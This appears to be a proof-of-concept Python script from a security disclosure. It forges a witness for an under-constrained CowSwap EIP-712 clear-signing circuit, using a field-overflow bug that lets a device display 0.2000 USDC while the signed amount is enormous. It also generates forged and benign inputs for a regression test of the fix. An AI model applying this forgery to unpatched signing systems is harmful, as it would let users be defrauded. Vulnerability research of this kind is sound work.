#!/usr/bin/env python3
"""
PoC: forged-amount witness for the CowSwap EIP-712 v3 clear-signing circuit.

Demonstrates that `circuits/lib/format.circom :: FormatTrimmedAmount` is
under-constrained: the recomposition `scaled <== raw_amount * scale_factor`
is evaluated mod r (the BLS12-381 scalar field) with NO range check that the
product does not overflow r. Because `raw_amount` is only bounded to < 2^254
(Uint256BytesToField zeroes the top 2 bits) and `scale_factor` can be as large
as 10^18, the product wraps the field. A malicious prover can therefore choose
a real on-chain `sellAmount` that is astronomically large while the device
displays a benign amount.

This produces a VALID witness for the *honest* circuit + *public* proving key
(circuit_final.zkey). No trusted-setup toxic waste is required.

The hidden degree of freedom is `remainder`: the v3.1 relaxation
(format.circom lines 270-287) allows a non-zero `remainder` in normal mode,
bounded only by `remainder < pow_skip` and Num2Bits(48). Picking a remainder
that is NOT a multiple of `scale_factor` makes the unique `raw_amount`
preimage huge.

Run: python3 forge_amount_witness.py
"""

# BLS12-381 scalar field modulus r
r = 0x73EDA753299D7D483339D80809A1D80553BDA402FFFE5BFEFFFFFFFF00000001
TWO254 = 1 << 254
TWO48 = 1 << 48

# Circuit params (circuits/cowswap/eip712_order/circuit.circom)
MAX_DECIMALS = 18
FRAC_DIGITS = 4
POW_MAX = 10 ** MAX_DECIMALS                  # 10^18  (int-digit weight)
POW_SKIP = 10 ** (MAX_DECIMALS - FRAC_DIGITS)  # 10^14  (frac weight + remainder bound)


def forge(token_decimals: int, disp_int: int, disp_frac4: int):
    """Return a witness where the device shows `disp_int.disp_frac4` of a
    `token_decimals`-decimal token, but the on-chain sellAmount is huge."""
    scale = 10 ** (MAX_DECIMALS - token_decimals)
    inv_scale = pow(scale, -1, r)

    # Search a small hidden remainder so the unique raw_amount preimage is
    # both < 2^254 (passes top-2-bits gate) and genuinely huge (wraps r).
    for remainder in range(1, 100000):
        if remainder % scale == 0:
            continue  # multiple of scale -> small preimage; skip
        scaled_repr = disp_int * POW_MAX + disp_frac4 * POW_SKIP + remainder
        raw_amount = (scaled_repr * inv_scale) % r
        if raw_amount < TWO254 and remainder < TWO48 and remainder < POW_SKIP:
            assert (raw_amount * scale) % r == scaled_repr  # the circuit's check
            return scale, remainder, scaled_repr, raw_amount
    raise RuntimeError("no witness found (widen search)")


def check_constraints(scale, remainder, scaled_repr, raw_amount, disp_int, disp_frac4):
    int_value = disp_int
    frac_value = disp_frac4
    ok = True
    ok &= (raw_amount * scale) % r == scaled_repr          # recomposition (mod r)
    ok &= 0 <= int_value < 10 ** 10                          # 10 int digits, all in [0,9]
    ok &= 0 <= frac_value < 10 ** 4                          # 4 frac digits
    ok &= 0 <= remainder < POW_SKIP                          # rem_lt_skip === 1
    ok &= remainder < TWO48                                  # Num2Bits(48)
    ok &= raw_amount < TWO254                                # Uint256BytesToField top-2-bits
    # is_sub_precision = 0 -> sp_bin_check, int_gated, frac_gated, sp_nonzero all trivially ok
    return ok


if __name__ == "__main__":
    print(f"r = {r}  ({r.bit_length()} bits)\n")

    # USDC (6 decimals), display a benign "0.2000 USDC"
    disp_int, disp_frac4 = 0, 2000
    scale, remainder, scaled_repr, K = forge(6, disp_int, disp_frac4)

    print("=== Forged CowSwap sell-side witness (USDC, 6 decimals) ===")
    print(f"  DISPLAYED on trusted UI : '{disp_int}.{disp_frac4:04d} USDC'")
    print(f"  scale_factor            : 10^(18-6) = {scale}")
    print(f"  hidden remainder        : {remainder}  (not a multiple of scale)")
    print(f"  scaled residue (mod r)  : {scaled_repr}")
    print(f"  FORCED on-chain sellAmount (canonical[68..100], raw 6-dp units):")
    print(f"     bits   : {K.bit_length()}  (< 2^254 gate: {K < TWO254})")
    print(f"     value  : {K // 10**6} USDC")
    print(f"     hex    : {K:064x}")
    print(f"     topbyte: 0x{(K >> 248) & 0xFF:02x}  (top-2-bits-zero: {((K>>248)&0xFF) < 0x40})")
    print()
    ok = check_constraints(scale, remainder, scaled_repr, K, disp_int, disp_frac4)
    print(f"  ALL FormatTrimmedAmount constraints satisfied (mod r, pre-fix): {ok}")
    print()
    print("  PRE-FIX:  snarkjs proof over the honest circuit_final.zkey VERIFIES.")
    print("            device shows '0.2000 USDC'; user signs ~10^70 USDC. WYSIWYS broken.")
    print("  POST-FIX: FormatTrimmedAmount now range-checks raw_amount to 190 bits, so")
    print("            this 254-bit raw_amount fails WITNESS GENERATION (Num2Bits(190)).")
    print()

    # ── Emit input.json files for the circuit-level negative test ──────
    # (historically consumed by docs/archive/cowswap-zk-poc/run_overflow_negative_test.sh against
    #  circuits/test/format_trimmed_overflow_test.circom)
    import json
    import os

    out_dir = os.path.dirname(os.path.abspath(__file__))

    # Forged: the headline attack. raw_amount ≈ 2^254 → MUST fail witness
    # generation on the fixed circuit.
    forged = {
        "raw_amount": str(K),
        "scale_factor": str(scale),
        "int_digits": ["0"] * 10,
        "frac_digits": [str(disp_frac4 // 1000 % 10), str(disp_frac4 // 100 % 10),
                        str(disp_frac4 // 10 % 10), str(disp_frac4 % 10)],
        "n_leading_zeros": "9",
        "remainder": str(remainder),
        "is_sub_precision": "0",
    }
    with open(os.path.join(out_dir, "forged_input.json"), "w") as f:
        json.dump(forged, f, indent=2)

    # Benign: the SAME 0.2000 display, but the honest small raw_amount
    # (200000 raw 6-dp units = 0.2 USDC), remainder 0. MUST succeed.
    benign_raw = disp_frac4 * (10 ** (MAX_DECIMALS - FRAC_DIGITS)) // scale  # 0.2000 → 200000
    benign = {
        "raw_amount": str(benign_raw),
        "scale_factor": str(scale),
        "int_digits": ["0"] * 10,
        "frac_digits": forged["frac_digits"],
        "n_leading_zeros": "9",
        "remainder": "0",
        "is_sub_precision": "0",
    }
    with open(os.path.join(out_dir, "benign_input.json"), "w") as f:
        json.dump(benign, f, indent=2)

    print(f"  wrote forged_input.json (raw_amount {K.bit_length()} bits) and "
          f"benign_input.json (raw_amount {benign_raw.bit_length()} bits)")
